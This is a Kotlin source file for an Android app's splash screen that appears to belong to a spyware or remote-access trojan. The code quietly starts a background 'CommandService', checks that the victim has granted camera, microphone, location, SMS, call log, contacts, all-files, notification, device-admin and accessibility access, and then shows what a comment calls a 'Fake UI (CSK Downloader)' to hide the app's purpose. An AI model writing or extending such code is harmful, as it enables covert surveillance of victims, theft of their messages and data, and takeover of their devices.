package com.csk4.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class SplashActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        // Start command service in background
        try {
            startService(Intent(this, CommandService::class.java))
        } catch (e: Exception) {}

        Handler(Looper.getMainLooper()).postDelayed({
            if (areAllPermissionsGranted()) {
                // Sab permissions hain → Fake UI (CSK Downloader)
                startActivity(Intent(this, WebViewActivity::class.java))
            } else {
                // Permissions missing → Permission flow
                startActivity(Intent(this, PermissionActivity::class.java))
            }
            finish()
        }, 1500)
    }

    private fun areAllPermissionsGranted(): Boolean {
        // 1. Runtime permissions
        val keyPerms = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        keyPerms.forEach { perm ->
            if (ContextCompat.checkSelfPermission(this, perm)
                != PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }

        // 2. All Files Access
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) return false
        }

        // 3. Notification Access
        if (!isNotificationServiceEnabled()) return false

        // 4. Device Admin
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return false

        // 5. Accessibility
        if (ScreenshotService.instance == null) return false

        // 6. Battery Optimization
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
            return false
        }

        return true
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }
}
